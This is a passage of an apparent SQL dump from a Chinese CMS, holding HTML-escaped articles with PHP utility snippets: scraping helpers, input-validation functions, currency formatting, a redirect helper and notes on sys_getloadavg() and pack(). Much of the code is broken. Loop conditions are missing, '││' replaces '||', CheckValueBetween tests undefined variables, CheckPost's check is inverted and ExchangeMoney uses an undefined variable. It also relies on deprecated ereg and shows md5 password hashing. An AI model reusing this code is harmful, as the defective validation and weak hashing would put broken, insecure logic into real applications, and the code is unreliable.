&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; if (isset($protocol[0])) { &lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $new_content = preg_replace(''/href=&quot;\\//'', ''href=&quot;''.$protocol[0].$server_url.''/'', $content); &lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $new_content = preg_replace(''/src=&quot;\\//'', ''src=&quot;''.$protocol[0].$server_url.''/'', $new_content); &lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; } else { &lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $new_content = $content; &lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; } &lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; return $new_content; &lt;br /&gt;\r\n} &lt;br /&gt;\r\n//取得所有链接&lt;br /&gt;\r\nfunction get_all_url($code){ &lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; preg_match_all(''/&amp;lt;a\\s+href=[&quot;|\\'']?([^&amp;gt;&quot;\\'' ]+)[&quot;|\\'']?\\s*[^&amp;gt;]*&amp;gt;([^&amp;gt;]+)&amp;lt;\\/a&amp;gt;/i'',$code,$arr); &lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; return array(''name''=&amp;gt;$arr[2],''url''=&amp;gt;$arr[1]); &lt;br /&gt;\r\n}&lt;/p&gt;\r\n&lt;p&gt;//获取指定标记中的内容&lt;br /&gt;\r\nfunction get_tag_data($str, $start, $end){&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; if ( $start == '''' || $end == '''' ){&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; return;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $str = explode($start, $str);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $str = explode($end, $str[1]);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; return $str[0]; &lt;br /&gt;\r\n}&lt;br /&gt;\r\n//HTML表格的每行转为CSV格式数组&lt;br /&gt;\r\nfunction get_tr_array($table) {&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $table = preg_replace(&quot;''&amp;lt;td[^&amp;gt;]*?&amp;gt;''si&quot;,''&quot;'',$table);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $table = str_replace(&quot;&amp;lt;/td&amp;gt;&quot;,''&quot;,'',$table);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $table = str_replace(&quot;&amp;lt;/tr&amp;gt;&quot;,&quot;{tr}&quot;,$table);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; //去掉 HTML 标记 &lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $table = preg_replace(&quot;''&amp;lt;[\\/\\!]*?[^&amp;lt;&amp;gt;]*?&amp;gt;''si&quot;,&quot;&quot;,$table);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; //去掉空白字符&amp;nbsp; &lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $table = preg_replace(&quot;''([\\r\\n])[\\s]+''&quot;,&quot;&quot;,$table);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $table = str_replace(&quot; &quot;,&quot;&quot;,$table);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $table = str_replace(&quot; &quot;,&quot;&quot;,$table);&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $table = explode(&quot;,{tr}&quot;,$table);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; array_pop($table);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; return $table;&lt;br /&gt;\r\n}&lt;/p&gt;\r\n&lt;p&gt;//将HTML表格的每行每列转为数组，采集表格数据 &lt;br /&gt;\r\nfunction get_td_array($table) {&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $table = preg_replace(&quot;''&amp;lt;table[^&amp;gt;]*?&amp;gt;''si&quot;,&quot;&quot;,$table);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $table = preg_replace(&quot;''&amp;lt;tr[^&amp;gt;]*?&amp;gt;''si&quot;,&quot;&quot;,$table);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $table = preg_replace(&quot;''&amp;lt;td[^&amp;gt;]*?&amp;gt;''si&quot;,&quot;&quot;,$table);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $table = str_replace(&quot;&amp;lt;/tr&amp;gt;&quot;,&quot;{tr}&quot;,$table);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $table = str_replace(&quot;&amp;lt;/td&amp;gt;&quot;,&quot;{td}&quot;,$table);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; //去掉 HTML 标记 &lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $table = preg_replace(&quot;''&amp;lt;[\\/\\!]*?[^&amp;lt;&amp;gt;]*?&amp;gt;''si&quot;,&quot;&quot;,$table);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; //去掉空白字符&amp;nbsp; &lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $table = preg_replace(&quot;''([\\r\\n])[\\s]+''&quot;,&quot;&quot;,$table);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $table = str_replace(&quot; &quot;,&quot;&quot;,$table);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $table = str_replace(&quot; &quot;,&quot;&quot;,$table);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $table = explode(''{tr}'', $table);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; array_pop($table);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; foreach ($table as $key=&amp;gt;$tr) {&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $td = explode(''{td}'', $tr);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; array_pop($td);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $td_array[] = $td;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; return $td_array;&lt;br /&gt;\r\n}&lt;/p&gt;\r\n&lt;p&gt;//返回字符串中的所有单词 $distinct=true 去除重复&lt;br /&gt;\r\nfunction split_en_str($str,$distinct=true) {&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; preg_match_all(''/([a-zA-Z]+)/'',$str,$match);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; if ($distinct == true) {&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $match[1] = array_unique($match[1]);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; sort($match[1]);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; return $match[1];&lt;br /&gt;\r\n}&lt;/p&gt;\r\n', 1, 1, 0, 0, 1302843891, 1, 'admin'),
(64, 1, 'php通用检测函数', '', '', '&lt;p&gt;// 函数名：CheckTelephone($C_telephone) &lt;br /&gt;\r\n// 作 用：判断是否为合法电话号码 &lt;br /&gt;\r\n// 参 数：$C_telephone（待检测的电话号码） &lt;br /&gt;\r\n// 返回值：布尔值 &lt;br /&gt;\r\n// 备 注：无 &lt;br /&gt;\r\n//----------------------------------------------------------------------------------- &lt;br /&gt;\r\n------- &lt;br /&gt;\r\nfunction CheckTelephone($C_telephone) &lt;br /&gt;\r\n{ &lt;br /&gt;\r\nif (!ereg(&quot;^[+]?[0-9]+([xX-][0-9]+)*$&quot;, $C_telephone)) return false; &lt;br /&gt;\r\nreturn true; &lt;br /&gt;\r\n} &lt;br /&gt;\r\n//----------------------------------------------------------------------------------- &lt;br /&gt;\r\n------- &lt;/p&gt;\r\n&lt;p&gt;//----------------------------------------------------------------------------------- &lt;br /&gt;\r\n------- &lt;br /&gt;\r\n// 函数名：CheckValueBetween($N_var, $N_val1, $N_val2) &lt;br /&gt;\r\n// 作 用：判断是否是某一范围内的合法值 &lt;br /&gt;\r\n// 参 数：$N_var 待检测的值 &lt;br /&gt;\r\n// $N_var1 待检测值的上限 &lt;br /&gt;\r\n// $N_var2 待检测值的下限 &lt;br /&gt;\r\n// 返回值：布尔值 &lt;br /&gt;\r\n// 备 注：无 &lt;br /&gt;\r\n//----------------------------------------------------------------------------------- &lt;br /&gt;\r\n------- &lt;br /&gt;\r\nfunction CheckValueBetween($N_var, $N_val1, $N_val2) &lt;br /&gt;\r\n{ &lt;br /&gt;\r\nif ($N_var &amp;lt; $N_var1 ││ $N_var &amp;gt; $N_var2) &lt;br /&gt;\r\n{ &lt;br /&gt;\r\nreturn false; &lt;br /&gt;\r\n} &lt;br /&gt;\r\nreturn true; &lt;br /&gt;\r\n} &lt;br /&gt;\r\n//----------------------------------------------------------------------------------- &lt;br /&gt;\r\n------- &lt;/p&gt;\r\n&lt;p&gt;//----------------------------------------------------------------------------------- &lt;br /&gt;\r\n------- &lt;br /&gt;\r\n// 函数名：CheckPost($C_post) &lt;br /&gt;\r\n// 作 用：判断是否为合法邮编（固定长度） &lt;br /&gt;\r\n// 参 数：$C_post（待check的邮政编码） &lt;br /&gt;\r\n// 返回值：布尔值 &lt;br /&gt;\r\n// 备 注：无 &lt;br /&gt;\r\n//----------------------------------------------------------------------------------- &lt;br /&gt;\r\n------- &lt;br /&gt;\r\nfunction CheckPost($C_post) &lt;br /&gt;\r\n{ &lt;br /&gt;\r\n$C_post=trim($C_post); &lt;br /&gt;\r\nif (strlen($C_post) == 6) &lt;br /&gt;\r\n{ &lt;br /&gt;\r\nif(!ereg(&quot;^[+]?[_0-9]*$&quot;,$C_post)) &lt;br /&gt;\r\n{ &lt;br /&gt;\r\nreturn true;; &lt;br /&gt;\r\n}else &lt;br /&gt;\r\n{ &lt;br /&gt;\r\nreturn false; &lt;br /&gt;\r\n} &lt;br /&gt;\r\n}else &lt;br /&gt;\r\n{ &lt;br /&gt;\r\nreturn false;; &lt;br /&gt;\r\n} &lt;br /&gt;\r\n} &lt;br /&gt;\r\n//----------------------------------------------------------------------------------- &lt;br /&gt;\r\n------- &lt;br /&gt;\r\n// 函数名：CheckExtendName($C_filename,$A_extend) &lt;br /&gt;\r\n// 作 用：上传文件的扩展名判断 &lt;br /&gt;\r\n// 参 数：$C_filename 上传的文件名 &lt;br /&gt;\r\n// $A_extend 要求的扩展名 &lt;br /&gt;\r\n// 返回值：布尔值 &lt;br /&gt;\r\n// 备 注：无 &lt;br /&gt;\r\n//----------------------------------------------------------------------------------- &lt;br /&gt;\r\n------- &lt;br /&gt;\r\nfunction CheckExtendName($C_filename,$A_extend) &lt;br /&gt;\r\n{ &lt;br /&gt;\r\nif(strlen(trim($C_filename)) &amp;lt; 5) &lt;br /&gt;\r\n{ &lt;br /&gt;\r\nreturn 0; //返回0表示没上传图片 &lt;br /&gt;\r\n} &lt;br /&gt;\r\n$lastdot = strrpos($C_filename, &quot;.&quot;); //取出.最后出现的位置 &lt;br /&gt;\r\n$extended = substr($C_filename, $lastdot+1); //取出扩展名 &lt;br /&gt;\r\nfor($i=0;$i{ &lt;br /&gt;\r\nif (trim(strtolower($extended)) == trim(strtolower($A_extend[$i]))) //转换大 &lt;br /&gt;\r\n小写并检测 &lt;br /&gt;\r\n{ &lt;br /&gt;\r\n$flag=1; //加成功标志 &lt;br /&gt;\r\n$i=count($A_extend); //检测到了便停止检测 &lt;br /&gt;\r\n} &lt;br /&gt;\r\n} &lt;br /&gt;\r\nif($flag&amp;lt;&amp;gt;1) &lt;br /&gt;\r\n{ &lt;br /&gt;\r\nfor($j=0;$j{ &lt;br /&gt;\r\n$alarm .= $A_extend[$j].&quot; &quot;; &lt;br /&gt;\r\n} &lt;br /&gt;\r\nAlertExit(''只能上传''.$alarm.''文件！而你上传的是''.$extended.''类型的文件''); &lt;br /&gt;\r\nreturn -1; //返回-1表示上传图片的类型不符 &lt;br /&gt;\r\n} &lt;br /&gt;\r\nreturn 1; //返回1表示图片的类型符合要求 &lt;br /&gt;\r\n} &lt;br /&gt;\r\n//----------------------------------------------------------------------------------- &lt;br /&gt;\r\n------- &lt;/p&gt;\r\n&lt;p&gt;//----------------------------------------------------------------------------------- &lt;br /&gt;\r\n------- &lt;br /&gt;\r\n// 函数名：CheckImageSize($ImageFileName,$LimitSize) &lt;br /&gt;\r\n// 作 用：检验上传图片的大小 &lt;br /&gt;\r\n// 参 数：$ImageFileName 上传的图片名 &lt;br /&gt;\r\n// $LimitSize 要求的尺寸 &lt;br /&gt;\r\n// 返回值：布尔值 &lt;br /&gt;\r\n// 备 注：无 &lt;br /&gt;\r\n//----------------------------------------------------------------------------------- &lt;br /&gt;\r\n------- &lt;br /&gt;\r\nfunction CheckImageSize($ImageFileName,$LimitSize) &lt;br /&gt;\r\n{ &lt;br /&gt;\r\n$size=GetImageSize($ImageFileName); &lt;br /&gt;\r\nif ($size[0]&amp;gt;$LimitSize[0] ││ $size[1]&amp;gt;$LimitSize[1]) &lt;br /&gt;\r\n{ &lt;br /&gt;\r\nAlertExit(''图片尺寸过大''); &lt;br /&gt;\r\nreturn false; &lt;br /&gt;\r\n} &lt;br /&gt;\r\nreturn true; &lt;br /&gt;\r\n} &lt;br /&gt;\r\n//----------------------------------------------------------------------------------- &lt;br /&gt;\r\n------- &lt;/p&gt;\r\n&lt;p&gt;//----------------------------------------------------------------------------------- &lt;br /&gt;\r\n------- &lt;br /&gt;\r\n// 函数名：Alert($C_alert,$I_goback=0) &lt;br /&gt;\r\n// 作 用：非法操作警告 &lt;br /&gt;\r\n// 参 数：$C_alert（提示的错误信息） &lt;br /&gt;\r\n// $I_goback（返回到那一页） &lt;br /&gt;\r\n// 返回值：字符串 &lt;br /&gt;\r\n// 备 注：无 &lt;br /&gt;\r\n//----------------------------------------------------------------------------------- &lt;br /&gt;\r\n------- &lt;br /&gt;\r\nfunction Alert($C_alert,$I_goback=0) &lt;br /&gt;\r\n{ &lt;br /&gt;\r\nif($I_goback&amp;lt;&amp;gt;0) &lt;br /&gt;\r\n{ &lt;br /&gt;\r\necho &quot; &quot;; &lt;br /&gt;\r\n} &lt;br /&gt;\r\nelse &lt;br /&gt;\r\n{ &lt;br /&gt;\r\necho &quot; &quot;; &lt;br /&gt;\r\n} &lt;br /&gt;\r\n} &lt;br /&gt;\r\n//----------------------------------------------------------------------------------- &lt;br /&gt;\r\n------- &lt;br /&gt;\r\n// 函数名：AlertExit($C_alert,$I_goback=0) &lt;br /&gt;\r\n// 作 用：非法操作警告 &lt;br /&gt;\r\n// 参 数：$C_alert（提示的错误信息） &lt;br /&gt;\r\n// $I_goback（返回到那一页） &lt;br /&gt;\r\n// 返回值：字符串 &lt;br /&gt;\r\n// 备 注：无 &lt;br /&gt;\r\n//----------------------------------------------------------------------------------- &lt;br /&gt;\r\n------- &lt;br /&gt;\r\nfunction AlertExit($C_alert,$I_goback=0) &lt;br /&gt;\r\n{ &lt;br /&gt;\r\nif($I_goback&amp;lt;&amp;gt;0) &lt;br /&gt;\r\n{ &lt;br /&gt;\r\necho &quot; &quot;; &lt;br /&gt;\r\nexit; &lt;br /&gt;\r\n} &lt;br /&gt;\r\nelse &lt;br /&gt;\r\n{ &lt;br /&gt;\r\necho &quot; &quot;; &lt;br /&gt;\r\nexit; &lt;br /&gt;\r\n} &lt;br /&gt;\r\n} &lt;br /&gt;\r\n//----------------------------------------------------------------------------------- &lt;br /&gt;\r\n------- &lt;/p&gt;\r\n&lt;p&gt;//----------------------------------------------------------------------------------- &lt;br /&gt;\r\n------- &lt;br /&gt;\r\n// 函数名：ReplaceSpacialChar($C_char) &lt;br /&gt;\r\n// 作 用：特殊字符替换函数 &lt;br /&gt;\r\n// 参 数：$C_char（待替换的字符串） &lt;br /&gt;\r\n// 返回值：字符串 &lt;br /&gt;\r\n// 备 注：无 &lt;br /&gt;\r\n//----------------------------------------------------------------------------------- &lt;br /&gt;\r\n------- &lt;br /&gt;\r\nfunction ReplaceSpecialChar($C_char) &lt;br /&gt;\r\n{ &lt;br /&gt;\r\n$C_char=HTMLSpecialChars($C_char); //将特殊字元转成 HTML 格式。 &lt;br /&gt;\r\n$C_char=nl2br($C_char); //将回车替换为&lt;br /&gt;\r\n$C_char=str_replace(&quot; &quot;,&quot; &quot;,$C_char); //替换空格替换为 &lt;br /&gt;\r\n$C_char=str_replace(&quot;return $C_char; &lt;br /&gt;\r\n} &lt;br /&gt;\r\n//----------------------------------------------------------------------------------- &lt;br /&gt;\r\n------- &lt;/p&gt;\r\n&lt;p&gt;//----------------------------------------------------------------------------------- &lt;br /&gt;\r\n------- &lt;br /&gt;\r\n// 函数名：ExchangeMoney($N_money) &lt;br /&gt;\r\n// 作 用：资金转换函数 &lt;br /&gt;\r\n// 参 数：$N_money（待转换的金额数字） &lt;br /&gt;\r\n// 返回值：字符串 &lt;br /&gt;\r\n// 备 注：本函数示例：$char=ExchangeMoney(5645132.3155) ==&amp;gt; &lt;br /&gt;\r\n$char=''￥5,645,132.31'' &lt;br /&gt;\r\n//----------------------------------------------------------------------------------- &lt;br /&gt;\r\n------- &lt;br /&gt;\r\nfunction ExchangeMoney($N_money) &lt;br /&gt;\r\n{ &lt;br /&gt;\r\n$A_tmp=explode(&quot;.&quot;,$N_money ); //将数字按小数点分成两部分，并存入数组$A_tmp &lt;br /&gt;\r\n$I_len=strlen($A_tmp[0]); //测出小数点前面位数的宽度 &lt;br /&gt;\r\nif($I_len%3==0) &lt;br /&gt;\r\n{ &lt;br /&gt;\r\n$I_step=$I_len/3; //如前面位数的宽度mod 3 = 0 ,可按，分成$I_step &lt;br /&gt;\r\n部分 &lt;br /&gt;\r\n}else &lt;br /&gt;\r\n{ &lt;br /&gt;\r\n$step=($len-$len%3)/3+1; //如前面位数的宽度mod 3 != 0 ,可按，分成$I_step &lt;br /&gt;\r\n部分+1 &lt;br /&gt;\r\n} &lt;br /&gt;\r\n$C_cur=&quot;&quot;; &lt;br /&gt;\r\n//对小数点以前的金额数字进行转换 &lt;br /&gt;\r\nwhile($I_len&amp;lt;&amp;gt;0) &lt;br /&gt;\r\n{ &lt;br /&gt;\r\n$I_step--; &lt;br /&gt;\r\nif($I_step==0) &lt;br /&gt;\r\n{ &lt;br /&gt;\r\n$C_cur .= substr($A_tmp[0],0,$I_len-($I_step)*3); &lt;br /&gt;\r\n}else &lt;br /&gt;\r\n{ &lt;br /&gt;\r\n$C_cur .= substr($A_tmp[0],0,$I_len-($I_step)*3).&quot;,&quot;; &lt;br /&gt;\r\n} &lt;br /&gt;\r\n$A_tmp[0]=substr($A_tmp[0],$I_len-($I_step)*3); &lt;br /&gt;\r\n$I_len=strlen($A_tmp[0]); &lt;br /&gt;\r\n} &lt;br /&gt;\r\n//对小数点后面的金额的进行转换 &lt;br /&gt;\r\nif($A_tmp[1]==&quot;&quot;) &lt;br /&gt;\r\n{ &lt;br /&gt;\r\n$C_cur .= &quot;.00&quot;; &lt;br /&gt;\r\n}else &lt;br /&gt;\r\n{ &lt;br /&gt;\r\n$I_len=strlen($A_tmp[1]); &lt;br /&gt;\r\nif($I_len&amp;lt;2) &lt;br /&gt;\r\n{ &lt;br /&gt;\r\n$C_cur .= &quot;.&quot;.$A_tmp[1].&quot;0&quot;; &lt;br /&gt;\r\n}else &lt;br /&gt;\r\n{ &lt;br /&gt;\r\n$C_cur .= &quot;.&quot;.substr($A_tmp[1],0,2); &lt;br /&gt;\r\n} &lt;br /&gt;\r\n} &lt;br /&gt;\r\n//加上人民币符号并传出 &lt;br /&gt;\r\n$C_cur=&quot;￥&quot;.$C_cur; &lt;br /&gt;\r\nreturn $C_cur; &lt;br /&gt;\r\n} &lt;br /&gt;\r\n//----------------------------------------------------------------------------------- &lt;br /&gt;\r\n------- &lt;/p&gt;\r\n&lt;p&gt;//----------------------------------------------------------------------------------- &lt;br /&gt;\r\n------ &lt;br /&gt;\r\n// 函数名：WindowLocation($C_url,$C_get=&quot;&quot;,$C_getOther=&quot;&quot;) &lt;br /&gt;\r\n// 作 用：PHP中的window.location函数 &lt;br /&gt;\r\n// 参 数：$C_url 转向窗口的URL &lt;br /&gt;\r\n// $C_get GET方法参数 &lt;br /&gt;\r\n// $C_getOther GET方法的其他参数 &lt;br /&gt;\r\n// 返回值: 字符串 &lt;br /&gt;\r\n// 备 注：无 &lt;br /&gt;\r\n//----------------------------------------------------------------------------------- &lt;br /&gt;\r\n----- &lt;br /&gt;\r\nfunction WindowLocation($C_url,$C_get=&quot;&quot;,$C_getOther=&quot;&quot;) &lt;br /&gt;\r\n{ &lt;br /&gt;\r\nif($C_get == &quot;&quot; &amp;amp;&amp;amp; $C_getOther == &quot;&quot;) &lt;br /&gt;\r\nif($C_get == &quot;&quot; &amp;amp;&amp;amp; $C_getOther &amp;lt;&amp;gt; &quot;&quot;){$C_target=&quot;&quot;window.location=''$C_url? &lt;br /&gt;\r\n$C_getOther=''+this.value&quot;&quot;;} &lt;br /&gt;\r\nif($C_get &amp;lt;&amp;gt; &quot;&quot; &amp;amp;&amp;amp; $C_getOther == &quot;&quot;){$C_target=&quot;&quot;window.location=''$C_url? &lt;br /&gt;\r\n$C_get''&quot;&quot;;} &lt;br /&gt;\r\nif($C_get &amp;lt;&amp;gt; &quot;&quot; &amp;amp;&amp;amp; $C_getOther &amp;lt;&amp;gt; &quot;&quot;){$C_target=&quot;&quot;window.location=''$C_url? &lt;br /&gt;\r\n$C_get&amp;amp;$C_getOther=''+this.value&quot;&quot;;} &lt;br /&gt;\r\nreturn $C_target; &lt;br /&gt;\r\n} &lt;br /&gt;\r\n//----------------------------------------------------------------------------------- &lt;br /&gt;\r\n----- &lt;br /&gt;\r\n?&amp;gt;&amp;nbsp; &lt;/p&gt;\r\n', 1, 1, 0, 0, 1302843979, 1, 'admin'),
(65, 1, 'PHP特殊函数', '', '', '&lt;p&gt;&lt;strong&gt;sys_getloadavg()&lt;/strong&gt; &lt;br /&gt;\r\n这个函数返回当前系统的负载均值信息（当然 &lt;a style=&quot;color:blue;&quot; href=&quot;http://www.waweb.cn/oslist/os.htm&quot; target=&quot;_blank&quot;&gt;Windows&lt;/a&gt; 下不适用），详细文档可以翻阅 PHP 的相关文档。文档中有段示例代码，基本上也就能看出它的用途了。 &lt;br /&gt;\r\n&amp;nbsp;&lt;/p&gt;\r\n&lt;div class=&quot;codetitle&quot;&gt;&lt;span style=&quot;cursor:pointer;&quot;&gt;&lt;u&gt;复制代码&lt;/u&gt;&lt;/span&gt; 代码如下:&lt;/div&gt;\r\n&lt;div id=&quot;code35580&quot; class=&quot;codebody&quot;&gt;&lt;br /&gt;\r\n&amp;lt;?php &lt;br /&gt;\r\n$load = sys_getloadavg(); &lt;br /&gt;\r\nif ($load[0] &amp;gt; 80) { &lt;br /&gt;\r\nheader(''HTTP/1.1 503 Too busy, try again later''); &lt;br /&gt;\r\ndie(''Server too busy. Please try again later.''); &lt;br /&gt;\r\n} &lt;br /&gt;\r\n&amp;nbsp;&lt;/div&gt;\r\n&lt;p&gt;&lt;br /&gt;\r\nPS，如果“很不幸”得你的 PHP 环境中没有这个函数，可以考虑使用下面这段代码 via &lt;br /&gt;\r\n&amp;nbsp;&lt;/p&gt;\r\n&lt;div class=&quot;codetitle&quot;&gt;&lt;span style=&quot;cursor:pointer;&quot;&gt;&lt;u&gt;复制代码&lt;/u&gt;&lt;/span&gt; 代码如下:&lt;/div&gt;\r\n&lt;div id=&quot;code27294&quot; class=&quot;codebody&quot;&gt;&lt;br /&gt;\r\nif (!function_exists(''sys_getloadavg'')) { &lt;br /&gt;\r\nfunction sys_getloadavg() &lt;br /&gt;\r\n{ &lt;br /&gt;\r\n$loadavg_file = ''/proc/loadavg''; &lt;br /&gt;\r\nif (file_exists($loadavg_file)) { &lt;br /&gt;\r\nreturn explode(chr(32),file_get_contents($loadavg_file)); &lt;br /&gt;\r\n} &lt;br /&gt;\r\nreturn array(0,0,0); &lt;br /&gt;\r\n} &lt;br /&gt;\r\n} &lt;br /&gt;\r\n&amp;nbsp;&lt;/div&gt;\r\n&lt;p&gt;&lt;br /&gt;\r\n这一特性如果使用得当，能减轻服务器部分压力。 &lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;strong&gt;pack()&lt;/strong&gt; &lt;br /&gt;\r\npack 对应的还有个函数为 unpack，用于压缩二进制串，文中的作者的示例非常清楚 &lt;br /&gt;\r\n&lt;br /&gt;\r\n$pass_hash = pack(&quot;H*&quot;, md5(&quot;my-password&quot;));如果你使用 PHP5，那么可以直接这样子 &lt;br 